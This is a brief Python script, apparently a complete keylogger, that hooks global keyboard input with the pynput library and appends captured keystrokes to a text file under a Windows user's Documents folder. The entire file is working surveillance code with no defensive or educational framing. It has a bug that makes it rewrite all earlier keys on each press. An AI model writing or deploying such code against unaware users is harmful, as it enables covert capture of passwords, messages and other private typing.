import pynput
from pynput.keyboard import Key,Listener

count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    write_file(keys)
    
def write_file(keys):
    with open("C:/Users/azureuser/Documents/logs.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)
            
with Listener(on_press=on_press) as listener:
    listener.join()
    
